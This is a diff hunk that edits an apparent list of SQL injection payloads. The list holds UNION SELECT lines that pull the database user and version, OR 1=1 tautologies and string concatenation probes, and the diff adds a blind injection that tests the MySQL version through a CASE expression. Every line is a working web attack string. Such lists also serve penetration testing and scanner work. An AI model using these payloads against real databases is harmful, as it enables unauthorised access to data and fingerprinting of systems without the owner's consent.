@@ -46,7 +46,7 @@ Ste'||'ven
 <b>mysql</b>
 Integer
 ') UNION SELECT user, version() --
-
+(Select case when substring(version(), 1, 1)='5' then 1 else 6 END)
 100) UNION SELECT …
 100 OR 1=1 --
 100) OR 1=1 --
